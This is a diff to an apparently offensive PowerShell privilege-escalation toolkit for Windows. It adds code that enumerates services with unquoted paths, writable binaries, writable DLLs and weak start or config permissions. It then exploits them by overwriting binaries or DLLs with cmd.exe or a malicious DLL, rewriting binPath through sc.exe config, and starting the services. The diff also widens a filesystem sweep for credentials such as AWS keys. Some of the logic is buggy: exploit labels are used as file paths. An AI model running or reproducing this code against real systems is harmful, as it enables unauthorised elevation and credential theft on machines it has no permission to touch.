@@ -10,6 +10,7 @@ $gCollect = @{
     Groups = @{}
     Credentials = @() 
     OtherData = @{}
+    ServicesData = @()  # Stores service details
 }
 
 $privList = @(
@@ -1350,7 +1351,6 @@ function Get-AccessTokenHandle {
     }
 }
 
-# Functions for each technique - checks and execution
 function checkCertySAN {
     if ($DEBUG_MODE) { Write-Output "Checking for Certify SAN vulnerabilities..." }
 
@@ -1629,14 +1629,277 @@ function checkServiceMisconfigurations {
         $writeableEnvPath["Path"] | Select-Object -First 5 | ForEach-Object { Write-Output $_ }
         Write-Output ""
     }
+
+    checkServicesPrivesc
 }
 
 function tryServiceMisconfigurations {
     if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via Service Misconfigurations..." }
-    # Logic for exploiting service misconfigurations
+    #tryServicesPrivesc
 }
 
-# New function for enumerating system basics
+function checkUnquotedServicePath {
+    param(
+        [Parameter(Mandatory=$true)][string]$serviceName
+    )
+
+    $service = Get-WmiObject Win32_Service | Where-Object { $_.Name -eq $serviceName }
+    if ($service) {
+        $path = $service.PathName
+        Write-Host "[+] Checking service: $serviceName for unquoted path issues"
+
+        # Check if the path contains spaces and isn't quoted
+        if ($path -match '^[A-Z]:\\[^"]+\s+[^"]') {
+            $potentialPaths = $path -replace '(^.+?\.exe)(.*)', '$1'  # Clean up to get executable path
+            Write-Host "[!] Potential unquoted path exploit: $potentialPaths.exe"
+            Write-Host "[!] Potential unquoted path exploit: $potentialPaths"
+
+            try {
+                $acl = Get-Acl $path  # Attempt to get ACLs for this path
+            }
+            catch {
+                Write-Warning "Get-Acl failed for $path`: $_"
+            }
+        }
+    }
+    else {
+        Write-Host "[!] Service not found: $serviceName"
+    }
+}
+
+function tryUnquotedServicePath {
+    param(
+        [string]$serviceName,
+        [string]$exploitPath = "C:\Windows\Temp\cmd.exe"
+    )
+
+    $service = Get-Service $serviceName
+    if ($service.Status -eq 'Running') {
+        Write-Warning "Service $serviceName is already running. Skipping exploit attempt."
+        return
+    }
+
+    # Copy cmd.exe to exploit path
+    try {
+        Write-Host "[*] Attempting to exploit service: $serviceName"
+        Copy-Item "C:\Windows\System32\cmd.exe" -Destination $exploitPath
+        Write-Host "[!] Copied cmd.exe to $exploitPath"
+    }
+    catch {
+        Write-Warning "Copy-Item failed: $_"
+        return
+    }
+
+    # Try to start the service
+    try {
+        Start-Service $serviceName
+        Write-Host "[!] Service started. Check for elevated CMD/PowerShell!"
+    }
+    catch {
+        Write-Warning "Failed to start service $serviceName`: $_"
+    }
+}
+
+function checkServicesPrivesc {
+    Write-Output "[$([char]0xD83D + [char]0xDC80)] Trying to find vulnerable services (unquoted etc.)"
+    
+    $services = Get-WmiObject Win32_Service
+    $DEBUG_MODE = $false
+
+    foreach ($service in $services) {
+        $servicePathName = ""
+        if ($service.PathName -match " -" ) {
+            $servicePathName = $service.PathName.Split(" -")[0] # Split at params
+        }
+        else {
+            $servicePathName = $service.PathName
+        }
+
+        $serviceExecutable = ""
+        $serviceDirPath = ""
+        if ($servicePathName) {
+            $serviceExecutable = ($servicePathName | Split-Path -Leaf)
+            $serviceDirPath    = ($servicePathName | Split-Path)
+        }
+
+        $serviceData = @{
+            Name                       = $service.Name
+            Path                       = $servicePathName
+            Executable                 = $serviceExecutable
+            DirPath                    = $serviceDirPath
+            PotentialExploit           = @()
+            WritablePaths              = @()
+            DLLHijackPaths             = @()
+            HasStartPermission         = $false
+            HasConfigChangePermission  = $false
+            ExploitFactorsCount        = 0
+        }
+
+        if ($DEBUG_MODE) { $serviceData.GetEnumerator() | ForEach-Object { Write-Output "$($_.Key): $($_.Value)" } }
+
+        # Unquoted Service Path Exploit Check
+        if ($service.PathName -notmatch '"') {
+            $serviceData.PotentialExploit += "UNQUOTED_SERVICE_PATH"
+            $serviceData.ExploitFactorsCount++
+        }
+
+        if ($serviceData.Path -match " " -and $serviceData.PotentialExploit -contains "UNQUOTED_SERVICE_PATH") {       
+            $serviceData.PotentialExploit += "SPACE_IN_PATH"
+            $serviceData.ExploitFactorsCount++
+
+            # Check if the executable exists
+            if ($serviceData.Path -and (Test-Path $serviceData.Path)) { 
+                # Check for writable paths
+                if ((Get-Acl $serviceData.DirPath).Access | Where-Object { $_.FileSystemRights -like '*Write*' }) {
+                    $serviceData.WritablePaths += $serviceData.DirPath
+                    $serviceData.ExploitFactorsCount++
+                }
+
+                # Check permissions on the executable using SIDs
+                $permissions = Get-Acl $serviceData.Path
+                $userSID = (New-Object System.Security.Principal.NTAccount($env:USERDOMAIN, $env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value
+
+                $servicePermissions = $permissions.Access | Where-Object { 
+                    ($_.IdentityReference -eq "S-1-1-0" -or   # Everyone
+                     $_.IdentityReference -eq $userSID -or
+                     $_.Owner -eq "S-1-1-0" -or                # Owner: Everyone
+                     $_.Owner -eq $userSID)                     # Owner: Current User
+                }
+
+                if ($servicePermissions) {
+                    if ($servicePermissions | Where-Object { $_.FileSystemRights -like '*Start*' }) {
+                        $serviceData.HasStartPermission = $true
+                        $serviceData.ExploitFactorsCount++
+                    }
+                    if ($servicePermissions | Where-Object { $_.FileSystemRights -like '*Change Config*' }) {
+                        $serviceData.HasConfigChangePermission = $true
+                        $serviceData.ExploitFactorsCount++
+                    }
+                }
+            } else {
+                if ($DEBUG_MODE) { Write-Host "[-] Path does not exist for service: $($serviceData.Name)" }
+            }
+        }
+
+        # Writable Service Binary Path Check
+        try {            
+            if (Test-Path $serviceData.Path) {
+                $permissions = Get-Acl -Path $serviceData.Path
+                if ($permissions.Access | Where-Object { $_.IdentityReference -eq $userSID -and $_.FileSystemRights -match 'Write' }) {
+                    Write-Host "[!] Writable service binary path found: $($serviceData.Path)"
+                    $serviceData.WritablePaths += $serviceData.Path
+                    $serviceData.ExploitFactorsCount++
+                }
+            } else {
+                if ($DEBUG_MODE) { Write-Host "[-] Path does not exist for service: $($service.Name)" }
+            }
+        } catch {
+            if ($DEBUG_MODE) { Write-Host "[-] Error checking ACL for service path: $($service.PathName) - $_" }
+        }
+
+        # DLL Hijacking Check
+        if ($service.State -eq "Running") {
+            try {
+                $processId = Get-WmiObject -Query "SELECT ProcessId FROM Win32_Service WHERE Name='$($service.Name)'" | Select-Object -ExpandProperty ProcessId
+                $process = Get-Process -Id $processId -ErrorAction Stop
+                $dlls = $process.Modules | Where-Object { $_.FileName -match ".dll" }
+
+                foreach ($dll in $dlls) {
+                    try {
+                        $dllPermissions = Get-Acl $dll.FileName
+                        if ($dllPermissions.Access | Where-Object { $_.IdentityReference -eq $userSID -and $_.FileSystemRights -match 'Write' }) {
+                            Write-Host "[!] Writable DLL path found: $($dll.FileName)"
+                            $serviceData.DLLHijackPaths += $dll.FileName
+                            $serviceData.ExploitFactorsCount++
+                        }
+                    } catch {
+                        if ($DEBUG_MODE) { Write-Host "[-] Error checking DLL path: $($dll.FileName) - $_" }
+                    }
+                }
+            } catch {
+                if ($DEBUG_MODE) { Write-Host "[-] Error checking DLL hijacking for $($service.Name) - $_" }
+            }
+        }
+
+        # Check for service start and config change permissions using sc.exe
+        $permissions = (sc.exe sdshow $service.Name) 2>&1 | Out-String
+        if ($permissions -match "AU.*RP") {
+            $serviceData.HasStartPermission = $true
+            $serviceData.ExploitFactorsCount++
+        }
+        if ($permissions -match "AU.*WP") {
+            $serviceData.HasConfigChangePermission = $true
+            $serviceData.ExploitFactorsCount++
+        }
+
+        # Output if multiple potential PrivEsc factors are found
+        if ($serviceData.ExploitFactorsCount -ge 4) {
+            Write-Host "[+] Service: $($serviceData.Name)"
+            Write-Host "[*] Path: $($serviceData.Path)"
+            Write-Host "[*] Potential Exploits: $($serviceData.PotentialExploit -join ', ')"
+            Write-Host "[*] Writable Paths: $($serviceData.WritablePaths -join ', ')"
+            Write-Host "[*] DLL Hijack Paths: $($serviceData.DLLHijackPaths -join ', ')"
+            Write-Host "[+] Has SERVICE_START permission: $($serviceData.HasStartPermission)"
+            Write-Host "[+] Has SERVICE_CHANGE_CONFIG permission: $($serviceData.HasConfigChangePermission)"
+            Write-Host "------------------------------------"
+        }
+
+        # Store service data in global object
+        $gCollect.ServicesData += $serviceData
+    }
+}
+
+function tryServicesPrivesc {
+    foreach ($serviceData in $gCollect.ServicesData) {
+        Write-Host "[*] Attempting to exploit service: $($serviceData.Name)"
+
+        # Exploit Unquoted Service Path
+        if ($serviceData.PotentialExploit.Count -gt 0) {
+            foreach ($exploitPath in $serviceData.PotentialExploit) {
+                Write-Host "[!] Attempting unquoted service path exploit: $exploitPath"
+                Copy-Item "C:\Windows\System32\cmd.exe" -Destination $exploitPath -Force
+                Start-Service $serviceData.Name
+                Write-Host "[!] Service started. Check for elevated CMD/PowerShell!"
+            }
+        }
+
+        # Exploit Writable Service Binary Path
+        if ($serviceData.WritablePaths.Count -gt 0) {
+            foreach ($writablePath in $serviceData.WritablePaths) {
+                Write-Host "[!] Replacing writable service binary at: $writablePath"
+                Copy-Item "C:\Windows\System32\cmd.exe" -Destination $writablePath -Force
+                Start-Service $serviceData.Name
+                Write-Host "[!] Service started. Check for elevated CMD/PowerShell!"
+            }
+        }
+
+        # Exploit DLL Hijacking
+        if ($serviceData.DLLHijackPaths.Count -gt 0) {
+            foreach ($dllPath in $serviceData.DLLHijackPaths) {
+                Write-Host "[!] Replacing writable DLL at: $dllPath"
+                Copy-Item "C:\Path\To\Malicious.dll" -Destination $dllPath -Force
+                Start-Service $serviceData.Name
+                Write-Host "[!] Service started. Check for elevated CMD/PowerShell!"
+            }
+        }
+
+        # Exploit Service Configuration Change
+        if ($serviceData.HasConfigChangePermission) {
+            Write-Host "[!] Modifying service configuration for: $($serviceData.Name)"
+            sc.exe config $serviceData.Name binPath= "C:\Windows\System32\cmd.exe"
+            Start-Service $serviceData.Name
+            Write-Host "[!] Service started. Check for elevated CMD/PowerShell!"
+        }
+
+        # Exploit Unauthorized Service Start
+        if ($serviceData.HasStartPermission) {
+            Write-Host "[!] Attempting to start service: $($serviceData.Name)"
+            Start-Service $serviceData.Name
+            Write-Host "[!] Service started. Check for elevated CMD/PowerShell!"
+        }
+    }
+}
+
 function enumerateSystemBasics {
     if ($DEBUG_MODE) { Write-Output "Enumerating system basics..." }
     Write-Output "[$([char]0xD83D + [char]0xDC80)] Basic System Enumeration:"
@@ -1657,7 +1920,6 @@ function enumerateSystemBasics {
     Write-Output "Writable Directories Found: $($writableDirs -join ', ')"
 }
 
-# Skeleton function for enumeration
 function runEnumeration {
     enumerateSystemBasics
     # Other enumeration logic can go here
@@ -2126,7 +2388,7 @@ function checkCreds {
     try {
         Write-Output "[$([char]0xD83D + [char]0xDC80)] Scanning for creds in files"
 
-        $dirsToSearch = @("$env:USERPROFILE")#, "$env:ProgramData", "$env:ProgramFiles", "$env:ProgramFiles(x86)", "$env:OneDrive") + ($env:Path -split ';')
+        $dirsToSearch = @("$env:USERPROFILE", "$env:ProgramData", "$env:ProgramFiles", "$env:ProgramFiles(x86)", "$env:OneDrive") + ($env:Path -split ';')
 
         $regexPatterns = @(
             @{ type = 'contents'; regex = 'A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA[A-Z0-9]{16}'; name = 'AWS Access Key ID Value' },
